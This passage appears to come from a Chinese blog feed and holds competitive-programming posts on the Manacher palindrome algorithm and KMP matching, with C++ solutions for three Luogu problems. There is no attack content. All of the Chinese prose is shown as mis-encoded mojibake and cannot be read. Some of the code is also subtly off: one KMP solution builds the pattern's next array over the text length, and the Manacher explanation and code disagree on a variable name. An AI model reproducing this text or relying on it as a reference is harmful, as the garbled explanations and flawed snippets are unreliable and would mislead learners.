çš„æ¡ä»¶ä¸‹ $s[i+j]==s[i-j]$ æ°¸è¿œæˆç«‹ã€‚</li><li>$wx$ ï¼šç›®å‰æ‰€æ±‚çš„æœ€è¿œå›æ–‡åŠå¾„å»¶ä¼¸çš„åœ°æ–¹ã€‚å³å½“å‰æƒ…å†µä¸‹çš„ $\max(i+p[i])$ã€‚  </li><li>$idx$ ï¼šä»£è¡¨ä¹‹å‰æ‰€æ±‚æœ€è¿œå›æ–‡åŠå¾„çš„ä¸­å¿ƒã€‚å³å–å¾—wxæ—¶çš„ $i$ çš„å€¼ã€‚</li></ul><p>é‚£ä¹ˆæœ‰äº†è¿™ä¸ªå®šä¹‰ä¹‹åæˆ‘ä»¬ä¸»è¦å°±æ˜¯æ±‚è¿™ä¸ªpæ•°ç»„äº†ï¼Œæ€ä¹ˆæ±‚å‘¢ï¼Ÿ</p><p>é¦–å…ˆï¼Œå¦‚æœæˆ‘æ‰€åœ¨çš„ä½ç½®åœ¨ä¹‹å‰ä¸€ä¸ªå¤§çš„å›æ–‡åŠå¾„å½“ä¸­ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥ç›´æ¥å‚è€ƒä¹‹å‰å¯¹ç§°çš„é‚£ä¸ªä½ç½®ä¸Šçš„pçš„å€¼ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a a a a b a a a a...</span><br><span class="line">    â†‘   â†‘   â†‘   â†‘</span><br><span class="line">    j idx   i   wx</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œ$p[i]$ è‡³å°‘æ˜¯å¤§äºç­‰äº $p[j]$ çš„ï¼Œå¦‚æœçœç•¥å·åé¢é©¬ä¸Šè·Ÿä¸€ä¸ª $b$ çš„è¯ï¼Œé‚£ä¹ˆå®ƒçš„ $p$ çš„å€¼å¯èƒ½ä¼šæ¶¨ï¼Œä½†æ˜¯æˆ‘ä»¬å°±ä¸ç”¨åˆ¤æ–­å®ƒå‘¨å›´ä¸¤è¾¹ç›¸ä¸ç›¸ç­‰äº†å•Šã€‚å¦‚æœå¤šäº†ï¼Œé‚£ä¹ˆæˆ‘æ¯”è¾ƒçš„æ¬¡æ•°å°±æ›´å°‘äº†ã€‚ä½†æ˜¯å‘¢ï¼Œå…¶å®å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬ç®¡çš„èŒƒå›´åªèƒ½åˆ°wxï¼Œå¤šä½™wxæˆ‘ä»¬è‚¯å®šä¸æ•¢ä¿è¯æ•°æ®å®Œå…¨å¯¹ç§°å¯ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é™åˆ¶ä¸€ä¸‹ $p[i]$ æœ€å¤§å¯èµ‹å€¼ä¸º $wx-i$ å³å¯ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬çš„æ ¸å¿ƒä»£ç å°±æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len2;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(mx&gt;i)&#123;</span><br><span class="line">        p[i]=<span class="built_in">min</span>(p[<span class="number">2</span>*idx-i],mx-i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">            p[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(new_s[i+p[i]]==new_s[i-p[i]])&#123;<span class="comment">//ç»§ç»­æ‰©å±•çœ‹çœ‹æœ‰æ²¡æœ‰å¯èƒ½</span></span><br><span class="line">        p[i]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i+p[i]&gt;mx)&#123;    </span><br><span class="line">        mx=i+p[i];</span><br><span class="line">        idx=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 22000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> new_s[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> p[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    new_s[<span class="number">0</span>]=<span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">    new_s[<span class="number">1</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> len1=<span class="built_in">strlen</span>(s),len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;i++)&#123;</span><br><span class="line">        new_s[<span class="number">2</span>*i+<span class="number">3</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        new_s[<span class="number">2</span>*i+<span class="number">2</span>]=s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    len2=<span class="built_in">strlen</span>(new_s)+<span class="number">1</span>;</span><br><span class="line">    new_s[len2<span class="number">-1</span>]=<span class="string">&#x27;~&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> mx=<span class="number">0</span>,idx=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len2;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(mx&gt;i)&#123;</span><br><span class="line">            p[i]=<span class="built_in">min</span>(p[<span class="number">2</span>*idx-i],mx-i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            p[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(new_s[i+p[i]]==new_s[i-p[i]])&#123;</span><br><span class="line">            p[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i+p[i]&gt;mx)&#123;</span><br><span class="line">            mx=i+p[i];</span><br><span class="line">            idx=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len2;i++)&#123;</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å­—ç¬¦ä¸² </category>
          
          <category> manacher </category>
          
          <category> å›æ–‡ä¸² </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KMPç®—æ³•çš„å­¦ä¹ </title>
      <link href="/2022/02/16/KMP%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/16/KMP%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å›¾è®ºä¹ŸæŒºéš¾çš„ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©å¤ä¹ ä¸€ä¸‹å­—ç¬¦ä¸²é‚£äº›ç®—æ³•ã€‚</p><span id="more"></span><p>å­—ç¬¦ä¸²ç®—æ³•ç¬¬ä¸€ä¸ªå¾ˆé‡è¦çš„å°±æ˜¯åŒ¹é…äº†ï¼Œä¹Ÿå°±æ˜¯ $KMP$ ç®—æ³•ï¼Œè¿™é‡Œçš„è¯ä¸»è¦å°±æ˜¯è®¡ç®—æ¨¡å¼ä¸²çš„ $Next$ æ•°ç»„ã€‚é‚£ä¸€ä½çš„ $Next$ æ•°ç»„çš„å€¼ç›¸å½“äºè¿™ä¸€ä½ä¹‹å‰çš„å­—ç¬¦ä¸²çš„æœ€å¤§ç›¸åŒå‰åç¼€é•¿åº¦ã€‚</p><p>æ¯”å¦‚ $baabaa$ é‚£ä¹ˆå®ƒçš„ $Next$ æ•°ç»„åˆ†åˆ«æ˜¯ $-1\ 0\ 0\ 0\ 1\ 2$ ã€‚ </p><p>ä¸ºä»€ä¹ˆæœ€å¼€å§‹çš„é‚£ä¸ªæ˜¯ $-1$ å‘¢ï¼Œå› ä¸ºè¯´äº†ï¼Œå½“å‰çš„nextæ‰€çœ‹çš„å­—ç¬¦ä¸²æ˜¯ä¸åŒ…æ‹¬å½“å‰å­—ç¬¦çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªçš„nextå€¼æ‰€çœ‹çš„å­—ç¬¦ä¸²å…¶å®æ˜¯ä¸€ä¸ªç©ºä¸²ã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœç¬¬ä¸€ä½å®ƒå°±ä¸åŒ¹é…ï¼Œæˆ‘è¦è·³åˆ°å“ªï¼Ÿç­”æ¡ˆæ˜¯æ¨¡å¼ä¸²æŒ‡é’ˆä¸è·³ï¼ŒåŒ¹é…ä¸²æŒ‡é’ˆè¦è·³ã€‚ä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹å¤±é…æ˜¯å®Œå…¨ç›¸åçš„ï¼Œåªæœ‰åŒ¹é…çš„æƒ…å†µä¸‹jä¼šå¾€åè·³ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šæŠŠç¬¬ä¸€ä½å¤±é…å’ŒåŒ¹é…çš„æƒ…å†µå½’ä¸ºä¸€ç±»ï¼Œæˆ–è€…æ˜¯è¯´ç‰¹åˆ¤ä¸€ä¸‹ç¬¬ä¸€ä½å¤±é…çš„æƒ…å†µï¼Œå°±è®©å®ƒè·³åˆ°-1ï¼Œå¦‚æœè·³åˆ°-1é‚£ä¹ˆ $i++,j++$ å°±å¥½äº†ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬åšä¸€é“æ¨¡æ¿åŒ¹é…é¢˜ã€‚</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>ä¸ºäº†é˜²æ­¢è¢«è¯´æ°´åšå®¢ï¼Œè¿™é‡Œå°±æ”¾ä¸‰é¢˜å¥½äº†ã€‚</p><h3 id="æ´›è°·P3375"><a href="#æ´›è°·P3375" class="headerlink" title="æ´›è°·P3375"></a><a href="https://www.luogu.com.cn/problem/P3375">æ´›è°·P3375</a></h3><p>æ ‡æ¿ $KMP$ï¼Œåªä¸è¿‡å°±æ˜¯è¯´ï¼Œæœ€åè¦é‚£ä½ è¾“å‡ºä¸€ä¸‹æ¨¡å¼ä¸²ä»å¼€å¤´åˆ° $i$ å­ä¸²ä¸²çš„æœ€é•¿å…¬å…±å‰åç¼€ï¼Œè¿™ä¸ªè·Ÿ $Next$ çš„æ•°ç»„è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„å•Šã€‚$Next$ çš„æ•°ç»„å¯¹åº”é‚£ä¸€ä½æ˜¯ä¸åŒ…æ‹¬è¿™ä¸ªå­—ç¬¦çš„ï¼Œæ‰€ä»¥è¿™ä¸ªè¾“å‡ºçš„è¯ä» $1$ åˆ° $n$ è¾“å‡ºå°±å¥½äº†ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000006</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">char</span> mod_str[maxn];<span class="comment">//æ¨¡å¼ä¸²</span></span><br><span class="line"><span class="keyword">int</span> kmp[maxn];<span class="comment">//nextæ•°ç»„</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>,s,mod_str);</span><br><span class="line">    <span class="keyword">int</span> len1=<span class="built_in">strlen</span>(s),len2=<span class="built_in">strlen</span>(mod_str);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len1;i++)&#123;<span class="comment">//è®¡ç®—æ¨¡å¼ä¸²çš„nextæ•°ç»„</span></span><br><span class="line">        <span class="keyword">int</span> t=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(mod_str[t]!=mod_str[i]&amp;&amp;t)&#123;</span><br><span class="line">            t=kmp[t];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(mod_str[t]==mod_str[i])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=t+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kmp[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||s[i]==mod_str[j])&#123;<span class="comment">//åŒ¹é…</span></span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            j=kmp[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==len2)&#123;<span class="comment">//è¾“å‡ºç­”æ¡ˆ</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i-j+<span class="number">1</span>);</span><br><span class="line">            j=kmp[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len2;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,kmp[i]);<span class="comment">//è¾“å‡ºnextæ•°ç»„</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ´›è°·P4391"><a href="#æ´›è°·P4391" class="headerlink" title="æ´›è°·P4391"></a><a href="https://www.luogu.com.cn/problem/P4391">æ´›è°·P4391</a></h3><p>å°±æ˜¯çœ‹çœ‹ä¸€ä¸ªå­—ç¬¦ä¸²å®ƒæ˜¯å“ªä¸ªå­ä¸²å¾ªç¯æ„æˆçš„ã€‚</p><p>æ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aabaab</span><br></pre></td></tr></table></figure><p>ä»–å°±èƒ½çœ‹æˆæ˜¯ $aab$ å¾ªç¯ç»„æˆçš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯ã€‚æˆ‘ä»¬åˆ†æä¸€ä¸‹è¿™æ ·çš„å­—ç¬¦ä¸²å®ƒçš„nextæ•°ç»„çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 0 0 0 1 2 3</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºä»€ä¹ˆå¤šå‡ºä¸€ä¸ª3ï¼Œå› ä¸ºåŒ¹é…å®Œæˆä¹‹åè¿˜å¾—è·³å¤±é…æŒ‡é’ˆã€‚è¿™é‡Œå¯èƒ½ä¸æ˜æ˜¾ï¼Œä½†æ˜¯ä½ å¤šå†™å‡ ä¸ªå°±ä¼šå‘ç°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aabaabaabaabaabaabaabaabaabaab</span><br><span class="line">-1 0 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13â€¦â€¦</span><br></pre></td></tr></table></figure><p>ç»“æœå·²ç»æ˜¾è€Œæ˜“è§äº†ï¼Œæˆ‘åªè¦å–å¾—æœ€åçš„nextå€¼ï¼Œç„¶åæ‹¿nå‡å»å®ƒå°±å¯ä»¥ç®—å‡ºå¾ªç¯å¤§å°äº†ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005 </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> ss[maxn];</span><br><span class="line"><span class="keyword">int</span> kmp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P4391_3.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,ss);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(ss[i]!=ss[p]&amp;&amp;p)&#123;</span><br><span class="line">            p=kmp[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ss[i]==ss[p])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=p+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    for(int i=0;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">//        printf(&quot;%d &quot;,kmp[i]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n-kmp[n]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ´›è°·P3435"><a href="#æ´›è°·P3435" class="headerlink" title="æ´›è°·P3435"></a><a href="https://www.luogu.com.cn/problem/P3435">æ´›è°·P3435</a></h3><p>å°±æ˜¯ç®—å‡ºæ‰€æœ‰å‰ç¼€çš„æœ€é•¿å¯è¡¨ç¤ºå‘¨æœŸï¼Œå¹¶ä¸”è¿™ä¸ªå‘¨æœŸé•¿åº¦åº”è¯¥å°äºè¿™ä¸ªå‰ç¼€ã€‚</p><p>è¿™ä¸ªæ€ä¹ˆè¯´å‘¢ï¼Œå°±æ˜¯å‡å¦‚ $aaaaa$ å®ƒä¼šç”±å“ªä¸ªå‘¨æœŸæ„æˆå‘¢ï¼Ÿç»“æœæœ‰å¾ˆå¤š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">aa</span><br><span class="line">aaa</span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šéƒ½å¯ä»¥æˆä¸ºå®ƒçš„å‘¨æœŸã€‚</p><p>å› ä¸ºæˆ‘ä»¬è¦æ‰¾æœ€é•¿çš„æ‰€ä»¥è¯´å‘¢å°±é€‰ $aaaa$ ã€‚</p><p>ä½†æ˜¯æœ‰ä¸€ç§æƒ…å†µæ˜¯ä¾‹å¤–çš„ï¼Œå°±æ˜¯ $aabaa$ è¿™ä¸ªå°±æœ‰ç‚¹ä¸ä¸€æ ·äº†ï¼Œå®ƒçœ‹ä¸Šå»å¥½åƒæ˜¯ $aab$ æœ€å¤§å‘¨æœŸï¼Œä½†æ˜¯å®ƒæœ€å¤§å‘¨æœŸå¯ä»¥åˆ° $aaba$ ï¼Œæ‰€ä»¥å‘¢æˆ‘ä»¬ç‰¹åˆ¤ä¸€ä¸‹æœ€åä¸€ä¸ªå­—ç¬¦å’Œç¬¬ä¸€ä¸ªä¸€ä¸ä¸€æ ·ï¼Œä¸€æ ·å°±ç›´æ¥ $n-1$ å°±-å¥½äº†ã€‚</p><p>ç„¶åå°±æ˜¯éå†æ•´ä¸ª $next$ æ•°ç»„ã€‚ä¸è¿‡ä¸ºäº†ä¿è¯æœ€é•¿ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è·³ $fail$ï¼Œè·³åˆ°ä¸ä¸º0çš„æ—¶å€™å³æ˜¯æœ€å¤§å‘¨æœŸï¼Œé˜²æ­¢é‡å¤è·³å¯ä»¥åŠ ä¸€ä¸ªä¼˜åŒ–ï¼Œè·³äº†ä¹‹åç›´æ¥æŠŠnextå€¼æ”¹æ‰ï¼Œæ”¹æˆæŒ‡å‘æœ€ç»ˆä½ç½®ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> kmp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(s[p]!=s[i]&amp;&amp;p)&#123;</span><br><span class="line">            p=kmp[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[p]==s[i])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=p+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kmp[i+<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[<span class="number">0</span>])&#123;</span><br><span class="line">                ans+=i;</span><br><span class="line">                <span class="comment">//printf(&quot;%d&#x27;s ans=%d\n&quot;,i,i);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">int</span> x=kmp[i+<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> q=i+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(kmp[x]!=<span class="number">0</span>)&#123;</span><br><span class="line">                    x=kmp[x];</span><br><span class="line">                &#125;</span><br><span class="line">                kmp[q]=x;</span><br><span class="line">                ans+=i-x+<span class="number">1</span>;</span><br><span class="line">                <span class="comment">//printf(&quot;%d&#x27;s ans=%d\n&quot;,i,i-x+1);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 